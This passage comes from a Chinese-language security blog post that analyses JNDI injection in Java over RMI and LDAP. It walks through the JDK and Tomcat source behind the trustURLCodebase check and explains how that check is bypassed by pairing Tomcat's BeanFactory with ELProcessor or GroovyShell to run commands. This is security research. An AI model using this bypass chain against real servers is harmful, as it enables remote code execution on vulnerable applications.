</p><p>版本8u351</p><p>经过我的一番苦苦调试（终于tm学会调试了），发现问题出在这里</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192028480.png" alt="image-20230228212541157"> </p><p>加入参数后即可正常运行</p><h4 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h4><p>其中 <code>getFactoryClassLocation()</code>方法是获取<code>classFactoryLocation</code>地址，可以看到，在 <code>ref != null &amp;&amp; ref.getFactoryClassLocation() != null</code> 的情况下，会对 <code>trustURLCodebase</code> 进行取反，由于在 <code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 版本及以后， <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为 <code>false</code> ，所以会进入 <code>if</code> 语句，抛出异常。</p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>如果要解码的对象 <code>r</code> 是远程引用，就需要先解引用然后再调用 <code>NamingManager.getObjectInstance</code>，其中会实例化对应的 <code>ObjectFactory</code> 类并调用其 <code>getObjectInstance</code> 方法，这也符合我们前面打印的 <code>EvilClass</code> 的执行顺序。</p><p>因此为了绕过这里 <code>ConfigurationException</code> 的限制，我们有三种方法: 令 <code>ref</code> 为空，或者 令 <code>ref.getFactoryClassLocation()</code> 为空，或者 * 令 <code>trustURLCodebase</code> 为 <code>true</code></p><p>方法一，令var8为空，语义上看需要 <code>obj</code> 既不是 <code>Reference</code> 也不是 <code>Referenceable</code>。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程 <code>RMI</code> 没有操作的空间，因此这种情况不太好利用；</p><p>方法二：令 <code>ref.getFactoryClassLocation()</code> 返回空。即，让 <code>ref</code> 对象的 <code>classFactoryLocation</code> 属性为空，这个属性表示引用所指向对象的对应 <code>factory</code> 名称，对于远程代码加载而言是 <code>codebase</code>，即远程代码的 <code>URL</code> 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 <code>factory</code> 是本地代码，则该值为空，这是绕过高版本 <code>JDK</code> 限制的关键；</p><p>方法三：我们已经在上节用过，即在命令行指定 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 参数。</p><p>那就去看看<code>getFactoryClassLocation()</code>方法，以及返回值的赋值情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> classFactoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Reference</span><span class="hljs-params">(String className, String factory, String factoryLocation)</span> &#123;<br>    <span class="hljs-built_in">this</span>(className);<br>    classFactory = factory;<br>    classFactoryLocation = factoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Reference</span><span class="hljs-params">(String className, RefAddr addr,</span><br><span class="hljs-params">                 String factory, String factoryLocation)</span> &#123;<br>    <span class="hljs-built_in">this</span>(className, addr);<br>    classFactory = factory;<br>    classFactoryLocation = factoryLocation;<br>&#125;<br></code></pre></td></tr></table></figure><p>要满足方法二情况，即让<code>ref.getFactoryClassLocation()</code> 返回空，我们只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code>。</p><p>它是负责根据 Reference 对象创建相应的 <code>ObjectFactory</code> 对象，并调用其 <code>getObjectInstance()</code> 方法来生成目标对象的类。</p><p>接着看一下 <code>javax.naming.spi.NamingManager</code> 的解析过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object<br>    <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object refInfo, Name name, Context nameCtx,</span><br><span class="hljs-params">                      Hashtable&lt;?,?&gt; environment)</span><br>    <span class="hljs-keyword">throws</span> Exception<br>&#123;<br><br>    ObjectFactory factory;<br><br>    <span class="hljs-comment">// Use builder if installed</span><br>    <span class="hljs-type">ObjectFactoryBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> getObjectFactoryBuilder();<br>    <span class="hljs-keyword">if</span> (builder != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// builder must return non-null factory</span><br>        factory = builder.createObjectFactory(refInfo, environment);<br>        <span class="hljs-keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,<br>            environment);<br>    &#125;<br><br>    <span class="hljs-comment">// Use reference if possible</span><br>    <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Reference) &#123;<br>        ref = (Reference) refInfo;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Referenceable) &#123;<br>        ref = ((Referenceable)(refInfo)).getReference();<br>    &#125;<br><br>    Object answer;<br><br>    <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ref.getFactoryClassName();<br>        <span class="hljs-keyword">if</span> (f != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// if reference identifies a factory, use exclusively</span><br><br>            factory = getObjectFactoryFromReference(ref, f);<br>            <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,<br>                                                 environment);<br>            &#125;<br>            <span class="hljs-comment">// No factory found, so return original refInfo.</span><br>            <span class="hljs-comment">// Will reach this point if factory class is not in</span><br>            <span class="hljs-comment">// class path and reference does not contain a URL for it</span><br>            <span class="hljs-keyword">return</span> refInfo;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// if reference has no factory, check for addresses</span><br>            <span class="hljs-comment">// containing URLs</span><br><br>            answer = processURLAddrs(ref, name, nameCtx, environment);<br>            <span class="hljs-keyword">if</span> (answer != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> answer;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// try using any specified factories</span><br>    answer =<br>        createObjectFromFactories(refInfo, name, nameCtx, environment);<br>    <span class="hljs-keyword">return</span> (answer != <span class="hljs-literal">null</span>) ? answer : refInfo;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，在处理 <code>Reference</code> 对象时，会先调用 <code>ref.getFactoryClassName()</code> 获取对应工厂类的名称，也就是会先从本地的<code>CLASSPATH</code>中寻找该类。如果不为空则直接实例化工厂类，并通过工厂类去实例化一个对象并返回；如果为空则通过网络去请求，即前文中的情况。</p><p>之后会执行静态代码块、代码块、无参构造函数和<code>getObjectInstance</code>方法。那么只需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在这四个地方其中一块能执行<code>payload</code>就可以了。但<code>getObjectInstance</code>方法需要你的类实现<code>javax.naming.spi.ObjectFactory</code>接口<br>因此，我们实际上可以指定一个存在于目标 <code>classpath</code> 中的工厂类名称，交由这个工厂类去实例化实际的目标类(即引用所指向的类)，从而间接实现一定的代码控制。<br>整个利用过程的主要调用栈如下：</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs leaf">InitialContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">lookup</span><span class="hljs-params">()</span></span><br>  RegistryContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">lookup</span><span class="hljs-params">()</span></span><br>    RegistryContext<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">decodeObject</span><span class="hljs-params">()</span></span><br>      NamingManager<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectInstance</span><span class="hljs-params">()</span></span><br>          objectfactory = NamingManager<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectFactoryFromReference</span><span class="hljs-params">()</span></span><br>                  Class<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">newInstance</span><span class="hljs-params">()</span></span>  //--&gt;恶意代码被执行<br>     或:   objectfactory<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getObjectInstance</span><span class="hljs-params">()</span></span>  //--&gt;恶意代码被执行<br></code></pre></td></tr></table></figure><p>总结一下<br>满足要求的工厂类条件： 存在于目标本地的 <code>CLASSPATH</code> 中实现 <code>javax.naming.spi.ObjectFactory</code> 接口 至少存在一个 <code>getObjectInstance()</code> 方法</p><p>而存在于 <code>Tomcat</code> 依赖包中的 <code>org.apache.naming.factory.BeanFactory</code> 就是个不错的选择<br><code>org.apache.naming.factory.BeanFactory</code> ，这个类在 <code>Tomcat</code> 中，很多 <code>web</code> 应用都会包含，它的关键代码：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs sqf">public <span class="hljs-built_in">Object</span> getObjectInstance(<span class="hljs-built_in">Object</span> obj, <span class="hljs-built_in">Name</span> <span class="hljs-built_in">name</span>, Context nameCtx,<br>                                Hashtable&lt;?,?&gt; environment)<br>    throws NamingException &#123;<br><br>    Reference ref = (Reference) obj;<br>    String beanClassName = ref.getClassName();<br>    ClassLoader tcl = Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-comment">// 1. 反射获取类对象</span><br>    <span class="hljs-keyword">if</span> (tcl != null) &#123;<br>        beanClass = tcl.loadClass(beanClassName);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        beanClass = Class.forName(beanClassName);<br>    &#125;<br>    <span class="hljs-comment">// 2. 初始化类实例</span><br>    <span class="hljs-built_in">Object</span> bean = beanClass.getConstructor().newInstance();<br><br>    <span class="hljs-comment">// 3. 根据 Reference 的属性查找 setter 方法的别名</span><br>    RefAddr ra = ref.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;forceString&quot;</span>);<br>    String value = (String)ra.getContent();<br><br>    <span class="hljs-comment">// 4. 循环解析别名并保存到字典中</span><br>    <span class="hljs-keyword">for</span> (String <span class="hljs-built_in">param</span>: value.split(<span class="hljs-string">&quot;,&quot;</span>)) &#123;<br>        <span class="hljs-built_in">param</span> = <span class="hljs-built_in">param</span>.<span class="hljs-built_in">trim</span>();<br>        index = <span class="hljs-built_in">param</span>.indexOf(<span class="hljs-string">&#x27;=&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-number">0</span>) &#123;<br>            setterName = <span class="hljs-built_in">param</span>.substring(index + <span class="hljs-number">1</span>).<span class="hljs-built_in">trim</span>();<br>            <span class="hljs-built_in">param</span> = <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">0</span>, index).<span class="hljs-built_in">trim</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            setterName = <span class="hljs-string">&quot;set&quot;</span> +<br>                <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>).toUpperCase(Locale.ENGLISH) +<br>                <span class="hljs-built_in">param</span>.substring(<span class="hljs-number">1</span>);<br>        &#125;<br>        forced.put(<span class="hljs-built_in">param</span>, beanClass.getMethod(setterName, paramTypes));<br>    &#125;<br><br>    <span class="hljs-comment">// 5. 解析所有属性，并根据别名去调用 setter 方法</span><br>    Enumeration&lt;RefAddr&gt; e = ref.getAll();<br>    <span class="hljs-keyword">while</span> (e.hasMoreElements()) &#123;<br>        ra = e.nextElement();<br>        String propName = ra.getType();<br>        String value = (String)ra.getContent();<br>        <span class="hljs-built_in">Object</span>[] valueArray = new <span class="hljs-built_in">Object</span>[<span class="hljs-number">1</span>];<br>        Method method = forced.<span class="hljs-built_in">get</span>(propName);<br>        <span class="hljs-keyword">if</span> (method != null) &#123;<br>            valueArray[<span class="hljs-number">0</span>] = value;<br>            method.invoke(bean, valueArray);<br>        &#125;<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面注释标注了关键的部分，我们可以通过在返回给客户端的 <code>Reference</code> 对象的 <code>forceString</code> 字段指定 <code>setter</code> 方法的别名，并在后续初始化过程中进行调用。<br><code>forceString</code> 的格式为 <code>a=foo,bar</code>，以逗号分隔每个需要设置的属性，如果包含等号，则对应的 <code>setter</code> 方法为等号后的值 <code>foo</code>，如果不包含等号，则 <code>setter</code> 方法为默认值 <code>setBar</code>。<br>在后续调用时，调用 <code>setter</code> 方法使用单个参数，且参数值为对应属性对象 <code>RefAddr</code> 的值 (<code>getContent</code>)。因此，实际上我们可以调用任意指定类的任意方法，并指定单个可控的参数。</p><p>因为使用 <code>newInstance</code>创建实例（也就是后面<code>Poc</code>中的<code>ELProcessor</code>），所以只能调用无参构造，这就要求目标 <code>class</code> 得有无参构造方法，上面 <code>forceString</code> 可以给属性强制指定一个 <code>setter</code> 方法，参数为一个 <code>String</code> 类型<br>于是找到 <code>javax.el.ELProcessor</code> 作为目标 <code>class</code>，利用 <code>el</code> 表达式执行命令，工具 <a href="https://github.com/welk1n/JNDI-Injection-Bypass">JNDI-Injection-Bypass</a> 中的 <code>EvilRMIServer.java</code> 部分代码如下</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192031866.png" alt="zongjie3.png"> </p><p>所以整个绕过流程就是：<br>为了绕过<code>ConfigurationException</code>，需要满足<code>ref.getFactoryClassLocation()</code> 为空，只需要在远程 <code>RMI</code> 服务器返回的 <code>Reference</code> 对象中不指定 <code>Factory</code> 的 <code>codebase</code></p><p>之后去分析<code>Reference</code>的调用过程，来到<code>NamingManager</code>，需要在攻击者本地<code>CLASSPATH</code>找到这个<code>Reference Factory</code>类并且在其中一块代码能执行<code>payload</code>，找到了<code>BeanFactory</code><br><code>BeanFactor</code>使用<code>newInstance</code>创建实例，所以只能调用无参构造，这就要求目标 <code>class</code> 得有无参构造方法且有办法执行相关命令，于是找到<code>ELProcessor</code>和<code>GroovyShell</code><br>总结起来就是绕过了<code>ConfigurationException</code>，进入<code>NamingManager</code>，使用<code>BeanFactor</code>创建<code>ELProcessor</code>&#x2F;<code>GroovyShell</code>无参实例，然后<code>BeanFactor</code>根据别名去调用方法（执行<code>ELProcessor</code>中的<code>eval</code>方法）</p><p>从代码中能看出该工具还有另一个利用方法，<code>groovy.lang.GroovyShell</code>，原理也是类似的</p><p>传入的 <code>Reference</code>为 <code>ResourceRef</code> 类，后面通过反射的方式实例化 <code>Reference</code> 所指向的任意 <code>Bean Class</code>，调用 <code>setter</code> 方法为所有的属性赋值，该 <code>Bean Class</code> 的类名、属性、属性值，全都来自于 <code>Reference</code> 对象。<code>ResourceRef</code>构造器的第七个参数<code>factoryLocation</code>是远程加载<code>factory</code>的地址，比如是一个<code>url</code>,这里将其设置为<code>null</code>,达到绕过<code>ConfigurationException</code>限制。</p><h2 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI_LDAP"></a>JNDI_LDAP</h2><h3 id="低版本JDK运行-1"><a href="#低版本JDK运行-1" class="headerlink" title="低版本JDK运行"></a>低版本JDK运行</h3><p>这里使用marshalsec来启动ldap服务端</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">mvn clean <span class="hljs-keyword">package</span> <span class="hljs-title">-DskipTests</span><br></code></pre></td></tr></table></figure><p>编译生成可执行jar包</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192031505.png" alt="image-20230309202850493">启动服务端</p><p>客户端代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">lookup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>().lookup(<span class="hljs-string">&quot;ldap://127.0.0.1:1389/foo&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ret&quot;</span>+lookup);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用jdk8u65时</p><p><img src="D:/mdimage/image-20230309203535976.png" alt="image-20230309203535976"> </p><p><code>JNDI</code>发起<code>ldap</code>的<code>lookup</code>后，将有如下的调用流程，这里我们直接来关注，获得远程<code>LDAP Server</code>的<code>Entry</code>之后，<code>Client</code>这边是怎么做处理的</p><p><img src="D:/mdimage/image-20230309211408157.png" alt="image-20230309211408157"> </p><p><code>LADP</code>服务利用流程分析，<code>LADP</code>服务前面的调用流程和<code>jndi</code>是基本一样，从<code>Obj</code>类的<code>decodeObject</code>方法这里就有些不太一样了，<code>decodeObject</code>方法内部调用了<code>decodeReference</code>方法<br>跟进<code>com.sun.jndi.ldap.Obj.java#decodeObject</code>，按照该函数的注释来看，其主要功能是解码从<code>LDAP Server</code>来的对象，该对象可能是序列化的对象，也可能是一个<code>Reference</code>对象。关于序列化对象的处理，我们看后面一节。这里摘取了<code>Reference</code>的处理方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> Object <span class="hljs-title function_">decodeObject</span><span class="hljs-params">(Attributes var0)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>    String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">4</span>]));<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Attribute var1;<br>        <span class="hljs-keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">1</span>])) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> helper.getURLClassLoader(var2);<br>            <span class="hljs-keyword">return</span> deserializeObject((<span class="hljs-type">byte</span>[])((<span class="hljs-type">byte</span>[])var1.get()), var3);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">7</span>])) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>]).get(), (String)var1.get(), var2);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            var1 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">0</span>]);<br>            <span class="hljs-type">return</span> <span class="hljs-variable">var1</span> <span class="hljs-operator">=</span>= <span class="hljs-literal">null</span> || !var1.contains(JAVA_OBJECT_CLASSES[<span class="hljs-number">2</span>]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[<span class="hljs-number">2</span>]) ? <span class="hljs-literal">null</span> : decodeReference(var0, var2);<br>            <span class="hljs-comment">//此处调用的decodeReference方法</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (IOException var5) &#123;<br>        <span class="hljs-type">NamingException</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NamingException</span>();<br>        var4.setRootCause(var5);<br>        <span class="hljs-keyword">throw</span> var4;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Obj</code>类的<code>decodeReference</code>方法根据<code>Ldap</code>传入的<code>addAttribute</code>属性构造并返回了一个新的<code>reference</code>对象引用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Reference <span class="hljs-title function_">decodeReference</span><span class="hljs-params">(Attributes var0, String[] var1)</span> <span class="hljs-keyword">throws</span> NamingException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Attribute var2;<br>        <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>])) == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidAttributesException</span>(JAVA_ATTRIBUTES[<span class="hljs-number">2</span>] + <span class="hljs-string">&quot; attribute is required&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> (String)var2.get();<br>            <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">3</span>])) != <span class="hljs-literal">null</span>) &#123;<br>                var4 = (String)var2.get();<br>            &#125;<br>            <span class="hljs-comment">//返回一个新的Reference对象引用</span><br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(var3, var4, var1 != <span class="hljs-literal">null</span> ? var1[<span class="hljs-number">0</span>] : <span class="hljs-literal">null</span>);<br>            <span class="hljs-comment">//获取第6个属性</span><br>            <span class="hljs-keyword">if</span> ((var2 = var0.get(JAVA_ATTRIBUTES[<span class="hljs-number">5</span>])) != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">//省略部分代码</span><br>            &#125;<br>            <span class="hljs-comment">//直接返回reference对象</span><br>            <span class="hljs-keyword">return</span> var5;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>LADP</code>服务的<code>Reference</code>对象引用的获取和<code>jndi</code>注入中的不太一样，<code>jndi</code>是通过<code>ReferenceWrapper_Stub</code>对象的<code>getReference</code>方法获取<code>reference</code>对象，而<code>LADP</code>服务是根据传入的属性构造一个新的<code>reference</code>对象引用，接着获取了第6个属性并判断是否为空，如果第6个属性为<code>null</code>则直接返回新的<code>reference</code>对象引用。</p><p>在new一个Reference时，三个属性如下</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303192036922.png" alt="image-20230309212054690"> </p><p>接着会返回到<code>decodeObject</code>方法调用处，然后再返回到<code>LdapCtx</code>类的<code>c_lookup</code>方法调用处，接着往下执行调用<code>getObjectInstance</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object refInfo, Name name, Context nameCtx , Hashtable&lt;?,?&gt; environment, Attributes attrs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>           ObjectFactory factory;<br>           <span class="hljs-comment">//获取对象工厂</span><br>           <span class="hljs-type">ObjectFactoryBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> getObjectFactoryBuilder();<br>           <span class="hljs-keyword">if</span> (builder != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-comment">// builder must return non-null factory</span><br>               factory = builder.createObjectFactory(refInfo, environment);<br>               <span class="hljs-keyword">if</span> (factory <span class="hljs-keyword">instanceof</span> DirObjectFactory) &#123;<br>                   <span class="hljs-keyword">return</span> ((DirObjectFactory)factory).getObjectInstance(<br>                       refInfo, name, nameCtx, environment, attrs);<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,<br>                       environment);<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-comment">// use reference if possible</span><br>           <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span 